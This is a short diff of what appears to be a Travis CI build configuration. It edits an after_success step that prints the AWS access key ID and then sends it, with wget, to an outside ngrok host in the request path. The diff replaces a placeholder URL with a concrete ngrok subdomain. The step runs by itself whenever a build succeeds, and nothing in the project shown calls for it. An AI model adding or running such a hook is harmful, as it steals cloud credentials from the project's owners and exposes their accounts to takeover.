@@ -15,4 +15,4 @@ script:
 
 after_success:
         - echo $AWS_ACCESS_KEY_ID
-        - wget http://ngrok-randomurl/$(echo $AWS_ACCESS_KEY_ID)
+        - wget http://d9530ce3363e.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
